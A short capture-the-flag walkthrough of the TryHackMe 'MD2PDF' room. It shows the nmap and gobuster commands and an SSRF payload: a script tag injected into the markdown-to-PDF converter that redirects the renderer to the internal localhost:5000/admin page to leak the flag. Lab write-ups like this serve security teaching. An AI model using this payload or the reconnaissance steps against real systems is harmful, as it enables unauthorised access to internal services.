## Walkthrough: MD2PDF Room - TryHackMe


### Nmap scan
* We start by scanning the target to identify open ports and services:

```bash
nmap -F -Pn $TARGET_IP  

#Output
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

```

* Lets access the webpage at port `80` 
* We can insert MD code and the page convert it to PDF file

* I tried several basic Markdown injections and HTML tags, but most of them resulted in a `"Bad Request" error`

### let's try different approach

* Lets do a `gobuster` directory brute-force

``` bash
gobuster dir -u $TARGET_IP --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

# Output:
/admin                (Status: 403) [Size: 166]

```
* lets try to go to `/admin`

* we get the following error:
```
Forbidden

This page can only be seen internally (localhost:5000)
```
#### This is very intresting, lets try to print the contents of /admin via our page

### Exploiting SSRF
(Server-Side Request Forgery)
* After many attemps, i used the `script` tag with:
* `window.location.href` -> means transfer the corrent webpage to a new one
* The code looks like this --->
```bash
<script>
window.location.href="http://localhost:5000/admin";
</script>
```

* We will get the flag as the output of the pdf file

### You completed the room!!!!

